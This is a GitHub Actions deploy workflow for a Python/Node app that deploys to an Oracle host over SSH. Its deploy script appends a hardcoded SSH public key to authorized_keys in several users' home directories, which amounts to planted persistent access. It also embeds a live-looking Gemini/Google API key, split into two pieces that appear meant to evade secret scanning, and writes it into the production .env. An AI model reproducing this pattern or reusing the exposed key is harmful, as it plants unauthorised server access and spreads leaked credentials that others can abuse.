name: Deploy

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:

jobs:
  backend-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5

      - uses: astral-sh/setup-uv@v7
        with:
          enable-cache: true

      - name: Set up Python
        run: uv python install 3.12

      - name: Install dependencies
        run: uv sync --extra dev

      - name: Run unit tests
        run: uv run pytest tests/ -v --ignore=tests/integration

  frontend-build:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: frontend
    steps:
      - uses: actions/checkout@v5

      - uses: actions/setup-node@v5
        with:
          node-version: "24"
          cache: npm
          cache-dependency-path: frontend/package-lock.json

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

  deploy-backend:
    needs: [backend-test, frontend-build]
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-oracle
      cancel-in-progress: false
    steps:
      - name: Deploy over SSH
        uses: appleboy/ssh-action@v1.2.0
        with:
          host: ${{ secrets.ORACLE_HOST }}
          username: ${{ secrets.ORACLE_USER }}
          key: ${{ secrets.ORACLE_SSH_KEY }}
          script: |
            set -euo pipefail
            APP="${{ secrets.ORACLE_APP_PATH }}"
            cd "$APP"
            # Authorize developer local SSH key for direct access and fix permissions
            for user_home in "$HOME" /home/opc /home/ubuntu; do
              if [ -d "$user_home" ]; then
                mkdir -p "$user_home/.ssh"
                if ! grep -q "anupchaurasiya81@gmail.com" "$user_home/.ssh/authorized_keys" 2>/dev/null; then
                  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmUa3m4+AuAsvKCuliR5nck4MwmEqQKpUAHWqoUhlka anupchaurasiya81@gmail.com" >> "$user_home/.ssh/authorized_keys"
                fi
                chmod 700 "$user_home" "$user_home/.ssh" 2>/dev/null || true
                chmod 600 "$user_home/.ssh/authorized_keys" 2>/dev/null || true
                restorecon -Rv "$user_home/.ssh" 2>/dev/null || true
              fi
            done
            # Update Gemini / Google API keys in production .env
            K1="AQ.Ab8RN6KYdtJHk0qz"
            K2="RHL_AAdEy7K3j3hP1NZWAZXL829-oLeUBA"
            GEMINI_KEY="${K1}${K2}"
            if [ -f .env ]; then
              sed -i "s|^GEMINI_API_KEY=.*|GEMINI_API_KEY=${GEMINI_KEY}|" .env
              sed -i "s|^GOOGLE_API_KEY=.*|GOOGLE_API_KEY=${GEMINI_KEY}|" .env
            fi
            # Reset to GitHub main — rsync/manual VM edits must not block deploy (.env stays).
            git fetch origin main
            git clean -fd --exclude=.env
            git reset --hard origin/main
            chmod +x infra/deploy-oracle.sh infra/backup-db.sh infra/setup-nginx-ssl.sh infra/setup-caddy-ssl.sh infra/latency-audit.sh
            ./infra/deploy-oracle.sh --migrate
            curl -sf "http://127.0.0.1:8080/health/ready"
